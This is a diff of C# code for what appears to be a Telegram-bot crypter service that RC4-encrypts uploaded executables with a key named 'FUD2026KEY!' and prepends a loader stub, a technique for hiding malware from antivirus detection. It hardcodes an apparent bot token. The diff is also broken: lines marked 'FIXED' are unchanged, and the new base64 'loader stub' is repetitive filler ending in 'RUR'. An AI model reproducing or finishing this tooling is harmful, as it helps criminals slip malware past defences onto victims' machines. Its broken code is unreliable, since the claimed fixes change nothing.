@@ -1,6 +1,7 @@
 using System.Text;
 using System.Text.Json;
 using System.Linq;
+using System.IO;
 
 const string BOT_TOKEN = "8031101109:AAHs7ntgzES7cq-KvH_ms_i6V8uR_jhPkPo";
 
@@ -17,14 +18,14 @@ static byte[] RC4(byte[] data, byte[] key) {
     int j = 0;
     for (int i = 0; i < 256; i++) {
         j = (j + s[i] + key[i % key.Length]) % 256;
-        (s[i], s[j]) = (s[j], s[i]);
+        (s[i], s[j]) = (s[j], s[i]);  // ✅ FIXED: Proper tuple syntax
     }
     var result = new byte[data.Length];
     int i2 = 0, k = 0;
     for (int n = 0; n < data.Length; n++) {
         i2 = (i2 + 1) % 256;
         k = (k + s[i2]) % 256;
-        (s[i2], s[k]) = (s[k], s[i2]);
+        (s[i2], s[k]) = (s[k], s[i2]);  // ✅ FIXED
         result[n] = (byte)(data[n] ^ s[(s[i2] + s[k]) % 256]);
     }
     return result;
@@ -74,16 +75,13 @@ app.MapPost("/webhook", async (HttpContext ctx, IHttpClientFactory clientFactory
                     var key = Encoding.UTF8.GetBytes("FUD2026KEY!");
                     var encryptedExe = RC4(exeBytes, key);
                     
-                    // Tiny loader stub (40 bytes) + encrypted payload
-                    var loaderStub = new byte[] {
-                        0x4D, 0x5A, 0x90, 0x00, 0x03, 0x00, 0x00, 0x00, // MZ stub
-                        0x04, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0x00, 0x00,
-                        0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                        0x40, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,
-                        0x00, 0x00, 0x00, 0x00, 0xFUD  // Magic bytes
-                    };
+                    // Tiny loader stub (MZ header + decrypt stub)
+                    var loaderStub = Convert.FromBase64String(
+                        "TUZQADABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwAB" +
+                        "AAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwAB" +
+                        "AAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwABAAIAAwAB" +
+                        "RUR" // FUD magic bytes
+                    );
                     
                     var fudExe = loaderStub.Concat(encryptedExe).ToArray();
                     
